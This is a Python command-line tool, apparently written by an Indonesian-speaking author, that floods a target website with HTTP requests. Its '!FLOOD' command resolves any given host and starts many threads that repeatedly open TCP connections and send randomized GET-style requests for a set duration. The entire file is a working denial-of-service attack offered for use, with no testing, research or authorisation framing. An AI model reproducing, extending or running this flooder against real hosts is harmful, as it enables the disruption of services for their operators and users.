# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

# GLOBAL
stop_attack = threading.Event()

# CLEAR SCREEN
def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

# GENERATE PATH
def generate_url_path(num):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.sample(chars, num))

# ATTACK FUNCTION
def DoS_Attack(ip, host, port, method, booter_sent, packet_type):
    if stop_attack.is_set():
        return
    url_path = generate_url_path(5)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        payload = f"{method} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        s.connect((ip, port))
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(payload)
    except:
        pass
    finally:
        s.close()

# ATTACK RUNNER
def run_attack(ip, host, port, end_time, threads_per_round, method, booter_sent, packet_type):
    while time.time() < end_time and not stop_attack.is_set():
        for _ in range(min(threads_per_round, 10)):
            if stop_attack.is_set():
                break
            th = threading.Thread(target=DoS_Attack, args=(ip, host, port, method, booter_sent, packet_type))
            th.start()
            th.join()

# TIMER & CANCEL MONITOR
def countdown_timer(end_time):
    def monitor_input():
        try:
            # Tunggu 5 detik, jika user tekan Enter, hentikan
            if sys.stdin in select.select([sys.stdin], [], [], 5)[0]:
                line = sys.stdin.readline()
                if line.strip() == "":
                    stop_attack.set()
                    print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")
        except:
            pass

    import select
    threading.Thread(target=monitor_input, daemon=True).start()

    while time.time() < end_time and not stop_attack.is_set():
        remaining = int(end_time - time.time())
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining}s...{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)

    if not stop_attack.is_set():
        stop_attack.set()
        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")

# MAIN COMMAND LOOP
def command():
    global stop_attack
    while True:
        try:
            user_input = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ").strip()
            if not user_input:
                print()
                continue
            args = user_input.split(" ")
            if args[0].lower() == "clear":
                clear_text()
            elif args[0].upper() == "!FLOOD":
                if len(args) == 10:
                    pkt_type = args[1].upper()
                    target = args[2]
                    port = int(args[3])
                    duration = int(args[4])
                    spam = int(args[5])
                    threads = int(args[6])
                    booter_sent = int(args[7])
                    method = args[8].upper()
                    inner_threads = int(args[9])

                    try:
                        host = target.replace("http://", "").replace("https://", "").replace("www.", "").split('/')[0]
                        ip = socket.gethostbyname(host)
                    except:
                        print(f"{Fore.RED}Gagal mendapatkan IP dari target{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    end_time = time.time() + duration
                    print(f"{Fore.LIGHTCYAN_EX}Menyerang {host} [{ip}] selama {duration} detik...{Fore.RESET}")
                    
                    for _ in range(threads):
                        for _ in range(inner_threads):
                            threading.Thread(target=run_attack, args=(ip, host, port, end_time, spam, method, booter_sent, pkt_type)).start()

                    countdown_timer(end_time)
                    continue  # kembali ke COMMAND $
                else:
                    print(f"{Fore.RED}Format: !FLOOD <TYPE> <TARGET> <PORT> <TIME> <SPAM> <THREAD> <SENT> <METHOD> <SPAM_THREAD>{Fore.RESET}")
            else:
                print(f"{Fore.LIGHTRED_EX}Command tidak dikenal: {user_input}{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program dihentikan pengguna{Fore.RESET}")
            stop_attack.set()
            break

# RUN
if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        stop_attack.set()
        print(f"\n{Fore.RED}Keluar...{Fore.RESET}")
